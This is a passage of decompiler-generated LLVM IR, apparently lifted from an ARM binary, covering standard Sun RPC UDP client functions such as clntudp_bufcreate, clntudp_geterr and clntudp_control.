  br i1 %v2_16350, label %dec_label_pc_162f4, label %dec_label_pc_16358

dec_label_pc_16358:                               ; preds = %dec_label_pc_1634c
  %v1_16358 = add i32 %v3_1634c, 16
  %v2_16358 = inttoptr i32 %v1_16358 to i32*
  %v3_16358 = load i32, i32* %v2_16358, align 4
  store i32 %v3_16358, i32* %r3.global-to-local, align 4
  %v2_1635c = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_1635c, i32* @r4, align 4
  %v1_16360 = inttoptr i32 %v3_16358 to i32*
  %v2_16360 = load i32, i32* %v1_16360, align 4
  store i32 %v2_16360, i32* @r1, align 4
  %v1_16364 = add i32 %v3_1634c, 12
  %v2_16364 = inttoptr i32 %v1_16364 to i32*
  %v3_16364 = load i32, i32* %v2_16364, align 4
  store i32 %v3_16364, i32* @r2, align 4
  store i32 5, i32* @r7, align 4
  %v2_1636c = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_1636c, i32* @r0, align 4
  %v0_16370 = call i32 @memcpy()
  %v0_16374 = load i32, i32* @r5, align 4
  %v1_16374 = add i32 %v0_16374, 4
  store i32 %v1_16374, i32* @lr, align 4
  %v0_1637c = load i32, i32* @r7, align 4
  store i32 %v0_1637c, i32* %r3.global-to-local, align 4
  store i32 %v2_1635c, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 2, i32* %stack_var_-68, align 4
  %v0_163a0 = load i32, i32* @r6, align 4
  %v7_163a4 = call i32 @__GI_clntudp_create(i32 %v2_1635c, i32 %arg2, i32 %arg3, i32 %v0_1637c, i32 %v0_163a0, i32 %v1_16374)
  store i32 %v7_163a4, i32* %r0.global-to-local, align 4
  %v2_163a8 = icmp eq i32 %v7_163a4, 0
  %v1_163b0 = load i32, i32* @r5, align 4
  %v2_163b0 = inttoptr i32 %v1_163b0 to i32*
  store i32 %v7_163a4, i32* %v2_163b0, align 4
  br i1 %v2_163a8, label %dec_label_pc_163b8, label %dec_label_pc_163c4

dec_label_pc_163b8:                               ; preds = %dec_label_pc_16358
  %v0_163b8 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_163b8, i32* %r0.global-to-local, align 4
  %v1_163bc = inttoptr i32 %v0_163b8 to i32*
  %v2_163bc = load i32, i32* %v1_163bc, align 4
  store i32 %v2_163bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16440

dec_label_pc_163c4:                               ; preds = %dec_label_pc_16358
  %v1_163c8 = load i32, i32* @r5, align 4
  %v2_163c8 = add i32 %v1_163c8, 16
  %v3_163c8 = inttoptr i32 %v2_163c8 to i32*
  store i32 1, i32* %v3_163c8, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v1_163d0 = load i32, i32* @r5, align 4
  %v2_163d0 = add i32 %v1_163d0, 8
  %v3_163d0 = inttoptr i32 %v2_163d0 to i32*
  store i32 %arg2, i32* %v3_163d0, align 4
  %v1_163d8 = load i32, i32* @r5, align 4
  %v2_163d8 = add i32 %v1_163d8, 12
  %v3_163d8 = inttoptr i32 %v2_163d8 to i32*
  store i32 %arg3, i32* %v3_163d8, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_163e0 = load i32, i32* @r5, align 4
  %v1_163e0 = add i32 %v0_163e0, 20
  %v2_163e0 = inttoptr i32 %v1_163e0 to i32*
  %v3_163e0 = load i32, i32* %v2_163e0, align 4
  store i32 %v3_163e0, i32* %r0.global-to-local, align 4
  %v3_163e8 = call i32 @strncpy(i32 %v3_163e0, i32 %arg1, i32 255)
  store i32 %v3_163e8, i32* %r0.global-to-local, align 4
  %v0_163ec = load i32, i32* @r5, align 4
  %v1_163ec = add i32 %v0_163ec, 20
  %v2_163ec = inttoptr i32 %v1_163ec to i32*
  %v3_163ec = load i32, i32* %v2_163ec, align 4
  store i32 %v3_163ec, i32* %r3.global-to-local, align 4
  %v0_163f0 = load i32, i32* @r6, align 4
  %v1_163f0 = trunc i32 %v0_163f0 to i8
  %v3_163f0 = add i32 %v3_163ec, 255
  %v4_163f0 = inttoptr i32 %v3_163f0 to i8*
  store i8 %v1_163f0, i8* %v4_163f0, align 1
  br label %dec_label_pc_163f4

dec_label_pc_163f4:                               ; preds = %dec_label_pc_1628c, %dec_label_pc_163c4
  %v0_163f4 = load i32, i32* @r5, align 4
  %v1_163f4 = inttoptr i32 %v0_163f4 to i32*
  %v2_163f4 = load i32, i32* %v1_163f4, align 4
  %v1_163f8 = add i32 %v2_163f4, 4
  %v2_163f8 = inttoptr i32 %v1_163f8 to i32*
  %v3_163f8 = load i32, i32* %v2_163f8, align 4
  store i32 %v2_163f4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v1_1642c = inttoptr i32 %v3_163f8 to i32*
  %v2_1642c = load i32, i32* %v1_1642c, align 4
  call void @__pseudo_branch(i32 %v2_1642c)
  %v0_16430 = load i32, i32* %r0.global-to-local, align 4
  %v2_16430 = icmp eq i32 %v0_16430, 0
  br i1 %v2_16430, label %dec_label_pc_16440, label %bb41

bb41:                                             ; preds = %dec_label_pc_163f4
  %v1_16434 = load i32, i32* %sl.global-to-local, align 4
  %v2_16434 = load i32, i32* @r5, align 4
  %v3_16434 = add i32 %v2_16434, 16
  %v4_16434 = inttoptr i32 %v3_16434 to i32*
  store i32 %v1_16434, i32* %v4_16434, align 4
  %v30_16444.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16440

dec_label_pc_1643c:                               ; preds = %dec_label_pc_16300, %dec_label_pc_162f4
  store i32 13, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16440

dec_label_pc_16440:                               ; preds = %bb, %bb41, %dec_label_pc_163f4, %dec_label_pc_163b8, %dec_label_pc_1643c
  %v30_16444 = phi i32 [ %v30_16444.pre, %bb41 ], [ 0, %dec_label_pc_163f4 ], [ 0, %bb ], [ %v2_163bc, %dec_label_pc_163b8 ], [ 13, %dec_label_pc_1643c ]
  store i32 %v21_161e0, i32* %sl.global-to-local, align 4
  ret i32 %v30_16444

; uselistorder directives
  uselistorder i32 %v0_16324, { 1, 0 }
  uselistorder i32 %v2_162c0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_162a0, { 1, 0, 2 }
  uselistorder i32 %v1_1624c, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 9, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 8, 10, 9, 14, 12, 11, 13, 15, 17, 16, 20, 18, 19, 22, 21, 23, 0 }
  uselistorder i32 %arg3, { 1, 3, 2, 0 }
  uselistorder i32 %arg2, { 2, 1, 4, 3, 0 }
  uselistorder i32 %arg1, { 3, 2, 5, 4, 1, 0, 6 }
  uselistorder label %dec_label_pc_16440, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_163f4, { 1, 0 }
  uselistorder label %dec_label_pc_16320, { 1, 0 }
  uselistorder label %dec_label_pc_162f4, { 1, 0 }
  uselistorder label %dec_label_pc_162e0, { 1, 0 }
  uselistorder label %dec_label_pc_162c0, { 1, 0 }
  uselistorder label %dec_label_pc_16260, { 1, 0 }
  uselistorder label %dec_label_pc_1623c, { 1, 0 }
}

define i32 @clntudp_geterr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_16448 = add i32 %arg1, 8
  %v2_16448 = inttoptr i32 %v1_16448 to i32*
  %v3_16448 = load i32, i32* %v2_16448, align 4
  %v1_1644c = add i32 %v3_16448, 44
  %v1_16454 = inttoptr i32 %v1_1644c to i32*
  %v2_16454 = load i32, i32* %v1_16454, align 4
  %v3_16454 = add i32 %v3_16448, 48
  %v4_16454 = inttoptr i32 %v3_16454 to i32*
  %v5_16454 = load i32, i32* %v4_16454, align 4
  store i32 %v5_16454, i32* %r1.global-to-local, align 4
  %v6_16454 = add i32 %v3_16448, 52
  %v7_16454 = inttoptr i32 %v6_16454 to i32*
  %v8_16454 = load i32, i32* %v7_16454, align 4
  store i32 %v8_16454, i32* %r2.global-to-local, align 4
  store i32 %v2_16454, i32* %arg2, align 4
  %v3_16458 = add i32 %tmp, 4
  %v4_16458 = inttoptr i32 %v3_16458 to i32*
  %v5_16458 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16458, i32* %v4_16458, align 4
  %v6_16458 = add i32 %tmp, 8
  %v7_16458 = inttoptr i32 %v6_16458 to i32*
  %v8_16458 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_16458, i32* %v7_16458, align 4
  ret i32 %v2_16454

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
}

define i32 @clntudp_freeres(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_16464 = add i32 %arg1, 8
  %v2_16464 = inttoptr i32 %v1_16464 to i32*
  %v3_16464 = load i32, i32* %v2_16464, align 4
  store i32 %v3_16464, i32* %r0.global-to-local, align 4
  %v2_1646c = add i32 %v3_16464, 56
  %v3_1646c = inttoptr i32 %v2_1646c to i32*
  store i32 2, i32* %v3_1646c, align 4
  %v0_16474 = load i32, i32* %r0.global-to-local, align 4
  %v1_16474 = add i32 %v0_16474, 56
  store i32 %v1_16474, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg2)
  ret i32 %v1_16474

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
}

define i32 @clntudp_abort() local_unnamed_addr {
entry:
  %v1_16488 = load i32, i32* @r0, align 4
  ret i32 %v1_16488
}

define i32 @clntudp_control(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_16490 = add i32 %arg2, -1
  %tmp = icmp ult i32 %v1_16490, 15
  br i1 %tmp, label %bb, label %dec_label_pc_164e4

bb:                                               ; preds = %entry
  %v7_164a0 = mul i32 %v1_16490, 4
  %v8_164a0 = add i32 %v7_164a0, ptrtoint (i32* @global_var_164a8.850 to i32)
  %v9_164a0 = inttoptr i32 %v8_164a0 to i32*
  %v10_164a0 = load i32, i32* %v9_164a0, align 4
  call void @__pseudo_branch(i32 %v10_164a0)
  br label %dec_label_pc_164e4

dec_label_pc_164e4:                               ; preds = %bb, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_16490, { 1, 0 }
}

define i32 @__GI_clntudp_bufcreate(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %v6_16654 = load i32, i32* @r5, align 4
  %v9_16654 = load i32, i32* @r6, align 4
  %v12_16654 = load i32, i32* @r7, align 4
  %v15_16654 = load i32, i32* @r8, align 4
  %v18_16654 = load i32, i32* @sb, align 4
  %v21_16654 = load i32, i32* @sl, align 4
  %v24_16654 = load i32, i32* @fp, align 4
  %v27_16654 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 12, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @fp, align 4
  store i32 %arg6, i32* @sb, align 4
  %v1_16674 = call i32 @malloc(i32 12)
  %v1_1667c = add i32 %arg7, 3
  %v1_16680 = and i32 %v1_1667c, -4
  store i32 %v1_16680, i32* @r8, align 4
  %v1_16688 = add i32 %arg8, 3
  store i32 %v1_16688, i32* %r3.global-to-local, align 4
  store i32 %v1_16674, i32* @r6, align 4
  %v1_16690 = and i32 %v1_16688, -4
  store i32 %v1_16690, i32* @r7, align 4
  %v1_16694 = add i32 %v1_16680, 100
  %v2_16698 = add i32 %v1_16694, %v1_16690
  store i32 %v2_16698, i32* %r0.global-to-local, align 4
  %v1_1669c = call i32 @malloc(i32 %v2_16698)
  store i32 %v1_1669c, i32* %r0.global-to-local, align 4
  %v2_166a0 = icmp eq i32 %v1_1669c, 0
  br i1 %v2_166a0, label %.thread3, label %bb

bb:                                               ; preds = %entry
  %v1_166a4 = load i32, i32* @r6, align 4
  %v3_166a4 = icmp eq i32 %v1_166a4, 0
  store i32 %v1_1669c, i32* @r5, align 4
  br i1 %v3_166a4, label %dec_label_pc_166b8, label %dec_label_pc_166e0

.thread3:                                         ; preds = %entry
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_166b8

dec_label_pc_166b8:                               ; preds = %bb, %.thread3
  %v0_166b8 = call i32 @__GI___rpc_thread_createerr()
  store i32 174224, i32* %r3.global-to-local, align 4
  store i32 %v0_166b8, i32* @r4, align 4
  %v2_166c4 = load i32, i32* @global_var_2a890, align 4
  store i32 ptrtoint ([31 x i8]* @global_var_1dccc.853 to i32), i32* %r0.global-to-local, align 4
  %v3_166cc = call i32 @__GI_fputs(i32 ptrtoint ([31 x i8]* @global_var_1dccc.853 to i32), i32 %v2_166c4)
  store i32 %v3_166cc, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v1_166d4 = load i32, i32* @r4, align 4
  %v2_166d4 = add i32 %v1_166d4, 8
  %v3_166d4 = inttoptr i32 %v2_166d4 to i32*
  store i32 12, i32* %v3_166d4, align 4
  %v0_166d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_166d8 = load i32, i32* @r4, align 4
  %v2_166d8 = inttoptr i32 %v1_166d8 to i32*
  store i32 %v0_166d8, i32* %v2_166d8, align 4
  br label %dec_label_pc_16878

dec_label_pc_166e0:                               ; preds = %bb
  store i32 0, i32* @sl, align 4
  %v1_166e0 = add i32 %v1_1669c, 96
  %v1_166e4 = load i32, i32* @r7, align 4
  %v2_166e4 = add i32 %v1_166e0, %v1_166e4
  store i32 %v2_166e4, i32* %r3.global-to-local, align 4
  %v2_166e8 = add i32 %v1_1669c, 88
  %v3_166e8 = inttoptr i32 %v2_166e8 to i32*
  store i32 %v2_166e4, i32* %v3_166e8, align 4
  %v0_166ec = load i32, i32* @r4, align 4
  %v1_166ec = add i32 %v0_166ec, 2
  %v2_166ec = inttoptr i32 %v1_166ec to i8*
  %v3_166ec = load i8, i8* %v2_166ec, align 1
  %v4_166ec = zext i8 %v3_166ec to i32
  store i32 %v4_166ec, i32* %r2.global-to-local, align 4
  %v1_166f0 = add i32 %v0_166ec, 3
  %v2_166f0 = inttoptr i32 %v1_166f0 to i8*
  %v3_166f0 = load i8, i8* %v2_166f0, align 1
  %v4_166f0 = zext i8 %v3_166f0 to i32
  %v4_166f4 = mul nuw nsw i32 %v4_166f0, 256
  %v5_166f4 = or i32 %v4_166f4, %v4_166ec
  store i32 %v5_166f4, i32* %r3.global-to-local, align 4
  %v7_166f4 = icmp eq i32 %v5_166f4, 0
  br i1 %v7_166f4, label %dec_label_pc_166fc, label %dec_label_pc_16734

dec_label_pc_166fc:                               ; preds = %dec_label_pc_166e0
  store i32 %v0_166ec, i32* %r0.global-to-local, align 4
  %v0_16700 = load i32, i32* @fp, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v4_1670c = call i32 @pmap_getport(i32 %v0_166ec, i32 %v0_16700, i32 %arg3, i32 17)
  store i32 %v4_1670c, i32* %r0.global-to-local, align 4
  %v2_16710 = icmp eq i32 %v4_1670c, 0
  br i1 %v2_16710, label %dec_label_pc_16878, label %dec_label_pc_16718

dec_label_pc_16718:                               ; preds = %dec_label_pc_166fc
  %v3_16718 = udiv i32 %v4_1670c, 256
  %v1_1671c = urem i32 %v4_1670c, 256
  %v1_16720 = urem i32 %v3_16718, 256
  %v4_16724 = mul nuw nsw i32 %v1_1671c, 256
  %v5_16724 = or i32 %v4_16724, %v1_16720
  store i32 %v5_16724, i32* %r3.global-to-local, align 4
  store i32 %v1_1671c, i32* %r2.global-to-local, align 4
  %v1_1672c = trunc i32 %v4_1670c to i8
  %v2_1672c = load i32, i32* @r4, align 4
  %v3_1672c = add i32 %v2_1672c, 3
  %v4_1672c = inttoptr i32 %v3_1672c to i8*
  store i8 %v1_1672c, i8* %v4_1672c, align 1
  %v0_16730 = load i32, i32* %r3.global-to-local, align 4
  %v1_16730 = trunc i32 %v0_16730 to i8
  %v2_16730 = load i32, i32* @r4, align 4
  %v3_16730 = add i32 %v2_16730, 2
  %v4_16730 = inttoptr i32 %v3_16730 to i8*
  store i8 %v1_16730, i8* %v4_16730, align 1
  br label %dec_label_pc_16734

dec_label_pc_16734:                               ; preds = %dec_label_pc_166e0, %dec_label_pc_16718
  store i32 ptrtoint (i32* @global_var_2abc4.855 to i32), i32* %r3.global-to-local, align 4
  %v0_16738 = load i32, i32* @r6, align 4
  %v1_16738 = add i32 %v0_16738, 4
  %v2_16738 = inttoptr i32 %v1_16738 to i32*
  store i32 ptrtoint (i32* @global_var_2abc4.855 to i32), i32* %v2_16738, align 4
  %v4_16738 = add i32 %v0_16738, 8
  %v5_16738 = inttoptr i32 %v4_16738 to i32*
  %v6_16738 = load i32, i32* @r5, align 4
  store i32 %v6_16738, i32* %v5_16738, align 4
  %v0_1673c = load i32, i32* @r4, align 4
  %v1_1673c = inttoptr i32 %v0_1673c to i32*
  %v2_1673c = load i32, i32* %v1_1673c, align 4
  store i32 %v2_1673c, i32* %r0.global-to-local, align 4
  %v3_1673c = add i32 %v0_1673c, 4
  %v4_1673c = inttoptr i32 %v3_1673c to i32*
  %v5_1673c = load i32, i32* %v4_1673c, align 4
  %v6_1673c = add i32 %v0_1673c, 8
  %v7_1673c = inttoptr i32 %v6_1673c to i32*
  %v8_1673c = load i32, i32* %v7_1673c, align 4
  store i32 %v8_1673c, i32* %r2.global-to-local, align 4
  %v9_1673c = add i32 %v0_1673c, 12
  %v10_1673c = inttoptr i32 %v9_1673c to i32*
  %v11_1673c = load i32, i32* %v10_1673c, align 4
  store i32 %v11_1673c, i32* %r3.global-to-local, align 4
  %v0_16740 = load i32, i32* @r5, align 4
  %v1_16740 = add i32 %v0_16740, 8
  %v1_16744 = inttoptr i32 %v1_16740 to i32*
  store i32 %v2_1673c, i32* %v1_16744, align 4
  %v3_16744 = add i32 %v0_16740, 12
  %v4_16744 = inttoptr i32 %v3_16744 to i32*
  store i32 %v5_1673c, i32* %v4_16744, align 4
  %v6_16744 = add i32 %v0_16740, 16
  %v7_16744 = inttoptr i32 %v6_16744 to i32*
  %v8_16744 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_16744, i32* %v7_16744, align 4
  %v9_16744 = add i32 %v0_16740, 20
  %v10_16744 = inttoptr i32 %v9_16744 to i32*
  %v11_16744 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_16744, i32* %v10_16744, align 4
  %v1_1674c = load i32, i32* @r5, align 4
  %v2_1674c = add i32 %v1_1674c, 24
  %v3_1674c = inttoptr i32 %v2_1674c to i32*
  store i32 16, i32* %v3_1674c, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @lr, align 4
  %v1_16758 = load i32, i32* @r5, align 4
  %v2_16758 = add i32 %v1_16758, 40
  %v3_16758 = inttoptr i32 %v2_16758 to i32*
  store i32 -1, i32* %v3_16758, align 4
  %v1_1675c = load i32, i32* @r5, align 4
  %v2_1675c = add i32 %v1_1675c, 28
  %v3_1675c = inttoptr i32 %v2_1675c to i32*
  store i32 %arg4, i32* %v3_1675c, align 4
  %v0_16760 = load i32, i32* @r7, align 4
  %v1_16760 = load i32, i32* @r5, align 4
  %v2_16760 = add i32 %v1_16760, 92
  %v3_16760 = inttoptr i32 %v2_16760 to i32*
  store i32 %v0_16760, i32* %v3_16760, align 4
  %v3_16764 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_16764, i32* %r3.global-to-local, align 4
  %v0_16768 = load i32, i32* @lr, align 4
  %v1_16768 = load i32, i32* @r5, align 4
  %v2_16768 = add i32 %v1_16768, 36
  %v3_16768 = inttoptr i32 %v2_16768 to i32*
  store i32 %v0_16768, i32* %v3_16768, align 4
  %v1_1676c = load i32, i32* @r5, align 4
  %v2_1676c = add i32 %v1_1676c, 32
  %v3_1676c = inttoptr i32 %v2_1676c to i32*
  store i32 %v3_16764, i32* %v3_1676c, align 4
  %v0_16770 = load i32, i32* @r8, align 4
  %v1_16770 = load i32, i32* @r5, align 4
  %v2_16770 = add i32 %v1_16770, 84
  %v3_16770 = inttoptr i32 %v2_16770 to i32*
  store i32 %v0_16770, i32* %v3_16770, align 4
  %v4_16774 = call i32 @_create_xid(i32 %v2_1673c, i32 %v5_1673c, i32 %arg4, i32 %v3_16764)
  store i32 %v4_16774, i32* %r0.global-to-local, align 4
  store i32 2, i32* @r7, align 4
  store i32 %v4_16774, i32* %stack_var_-96, align 4
  %v0_16788 = load i32, i32* @fp, align 4
  %v0_1678c = load i32, i32* @sl, align 4
  %v0_16794 = load i32, i32* @r5, align 4
  %v1_16794 = add i32 %v0_16794, 56
  store i32 %v1_16794, i32* @r4, align 4
  %v0_16798 = load i32, i32* @r8, align 4
  store i32 %v0_16798, i32* %r2.global-to-local, align 4
  %v1_1679c = add i32 %v0_16794, 88
  %v2_1679c = inttoptr i32 %v1_1679c to i32*
  %v3_1679c = load i32, i32* %v2_1679c, align 4
  store i32 %v0_1678c, i32* %r3.global-to-local, align 4
  store i32 %v1_16794, i32* %r0.global-to-local, align 4
  %v9_167a8 = inttoptr i32 %v1_16794 to i32*
  %v10_167a8 = call i32 @__GI_xdrmem_create(i32* %v9_167a8, i32 %v3_1679c, i32 %v0_16798, i32 %v0_1678c, i32 %v4_16774, i32 %v0_1678c, i32 2, i32 %v0_16788, i32 %arg3)
  %v0_167ac = load i32, i32* @r4, align 4
  store i32 %v0_167ac, i32* %r0.global-to-local, align 4
  %v2_167b0 = ptrtoint i32* %stack_var_-96 to i32
  %v2_167b4 = inttoptr i32 %v0_167ac to i32*
  %v3_167b4 = call i32 @__GI_xdr_callhdr(i32* %v2_167b4, i32 %v2_167b0)
  store i32 %v3_167b4, i32* %r0.global-to-local, align 4
  %v2_167b8 = icmp eq i32 %v3_167b4, 0
  br i1 %v2_167b8, label %dec_label_pc_16878, label %dec_label_pc_167c0

dec_label_pc_167c0:                               ; preds = %dec_label_pc_16734
  %v0_167c0 = load i32, i32* @r5, align 4
  %v1_167c0 = add i32 %v0_167c0, 60
  %v2_167c0 = inttoptr i32 %v1_167c0 to i32*
  %v3_167c0 = load i32, i32* %v2_167c0, align 4
  store i32 %v3_167c0, i32* %r3.global-to-local, align 4
  %v0_167c4 = load i32, i32* @r4, align 4
  store i32 %v0_167c4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_167d0.856 to i32), i32* @lr, align 4
  %v1_167cc = add i32 %v3_167c0, 16
  %v2_167cc = inttoptr i32 %v1_167cc to i32*
  %v3_167cc = load i32, i32* %v2_167cc, align 4
  call void @__pseudo_branch(i32 %v3_167cc)
  %v0_167d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_167d0 = load i32, i32* @r5, align 4
  %v2_167d0 = add i32 %v1_167d0, 80
  %v3_167d0 = inttoptr i32 %v2_167d0 to i32*
  store i32 %v0_167d0, i32* %v3_167d0, align 4
  %v0_167d4 = load i32, i32* @sb, align 4
  %v1_167d4 = inttoptr i32 %v0_167d4 to i32*
  %v2_167d4 = load i32, i32* %v1_167d4, align 4
  store i32 %v2_167d4, i32* %r3.global-to-local, align 4
  %v1_167d8 = icmp slt i32 %v2_167d4, 0
  br i1 %v1_167d8, label %dec_label_pc_167e4, label %bb31

bb31:                                             ; preds = %dec_label_pc_167c0
  %v3_167dc = load i32, i32* @sl, align 4
  %v4_167dc = load i32, i32* @r5, align 4
  %v5_167dc = add i32 %v4_167dc, 4
  %v6_167dc = inttoptr i32 %v5_167dc to i32*
  store i32 %v3_167dc, i32* %v6_167dc, align 4
  br label %dec_label_pc_16864

dec_label_pc_167e4:                               ; preds = %dec_label_pc_167c0
  %v0_167e4 = load i32, i32* @r7, align 4
  store i32 %v0_167e4, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 1, i32* %stack_var_-44, align 4
  %v0_167f8 = call i32 @socket()
  store i32 %v0_167f8, i32* %r0.global-to-local, align 4
  %v1_167fc = icmp slt i32 %v0_167f8, 0
  %v1_16800 = load i32, i32* @sb, align 4
  %v2_16800 = inttoptr i32 %v1_16800 to i32*
  store i32 %v0_167f8, i32* %v2_16800, align 4
  br i1 %v1_167fc, label %dec_label_pc_16808, label %dec_label_pc_16828

dec_label_pc_16808:                               ; preds = %dec_label_pc_167e4
  %v0_16808 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_16808, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16810 = inttoptr i32 %v0_16808 to i32*
  store i32 12, i32* %v2_16810, align 4
  store i32 %v0_16808, i32* @r4, align 4
  %v0_16818 = call i32 @__errno_location()
  store i32 %v0_16818, i32* %r0.global-to-local, align 4
  %v1_1681c = inttoptr i32 %v0_16818 to i32*
  %v2_1681c = load i32, i32* %v1_1681c, align 4
  store i32 %v2_1681c, i32* %r3.global-to-local, align 4
  %v1_16820 = load i32, i32* @r4, align 4
  %v2_16820 = add i32 %v1_16820, 8
  %v3_16820 = inttoptr i32 %v2_16820 to i32*
  store i32 %v2_1681c, i32* %v3_16820, align 4
  br label %dec_label_pc_16878

dec_label_pc_16828:                               ; preds = %dec_label_pc_167e4
  %v0_16828 = load i32, i32* @sl, align 4
  %v2_1682c = inttoptr i32 %v0_16828 to i8*
  %v3_1682c = call i32 @__GI_bindresvport(i32 %v0_167f8, i8* %v2_1682c)
  store i32 %v3_1682c, i32* %r0.global-to-local, align 4
  %v2_16834 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_16834, i32* %r2.global-to-local, align 4
  %v0_16838 = load i32, i32* @sb, align 4
  %v1_16838 = inttoptr i32 %v0_16838 to i32*
  %v2_16838 = load i32, i32* %v1_16838, align 4
  store i32 %v2_16838, i32* @r0, align 4
  %v4_1683c = call i32 @ioctl(i32 %v2_16838, i32 21537, i32 %v2_16834)
  store i32 %v4_1683c, i32* %r0.global-to-local, align 4
  %v0_16840 = load i32, i32* @sb, align 4
  %v1_16840 = inttoptr i32 %v0_16840 to i32*
  %v2_16840 = load i32, i32* %v1_16840, align 4
  store i32 %v2_16840, i32* %r0.global-to-local, align 4
  %v0_16848 = load i32, i32* @sl, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v2_16850 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_16850, i32* %r3.global-to-local, align 4
  %v0_16858 = load i32, i32* @r4, align 4
  store i32 %v0_16858, i32* %stack_var_-48, align 4
  %v6_1685c = call i32 @__GI_setsockopt(i32 %v2_16840, i32 %v0_16848, i32 11, i32* nonnull %stack_var_-48, i32 4)
  store i32 %v6_1685c, i32* %r0.global-to-local, align 4
  %v0_16860 = load i32, i32* @r4, align 4
  %v1_16860 = load i32, i32* @r5, align 4
  %v2_16860 = add i32 %v1_16860, 4
  %v3_16860 = inttoptr i32 %v2_16860 to i32*
  store i32 %v0_16860, i32* %v3_16860, align 4
  br label %dec_label_pc_16864

dec_label_pc_16864:                               ; preds = %bb31, %dec_label_pc_16828
  %v0_16864 = load i32, i32* @sb, align 4
  %v1_16864 = inttoptr i32 %v0_16864 to i32*
  %v2_16864 = load i32, i32* %v1_16864, align 4
  store i32 %v2_16864, i32* %r3.global-to-local, align 4
  %v1_16868 = load i32, i32* @r5, align 4
  %v2_16868 = inttoptr i32 %v1_16868 to i32*
  store i32 %v2_16864, i32* %v2_16868, align 4
  %v0_1686c = call i32 @authnone_create()
  store i32 %v0_1686c, i32* %r0.global-to-local, align 4
  %v1_16870 = load i32, i32* @r6, align 4
  %v2_16870 = inttoptr i32 %v1_16870 to i32*
  store i32 %v0_1686c, i32* %v2_16870, align 4
  %v0_16898.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16898

dec_label_pc_16878:                               ; preds = %dec_label_pc_16734, %dec_label_pc_166fc, %dec_label_pc_16808, %dec_label_pc_166b8
  %v0_16878 = load i32, i32* @r5, align 4
  %v2_16878 = icmp eq i32 %v0_16878, 0
  br i1 %v2_16878, label %bb33, label %bb32

bb32:                                             ; preds = %dec_label_pc_16878
  store i32 %v0_16878, i32* %r0.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %dec_label_pc_16878, %bb32
  store i32 92292, i32* @lr, align 4
  %v1_16880 = xor i1 %v2_16878, true
  call void @__pseudo_cond_branch(i1 %v1_16880, i32 ptrtoint (i32* @global_var_134b0.561 to i32))
  %v0_16884 = load i32, i32* @r6, align 4
  %v2_16884 = icmp eq i32 %v0_16884, 0
  br i1 %v2_16884, label %dec_label_pc_16898, label %dec_label_pc_1688c

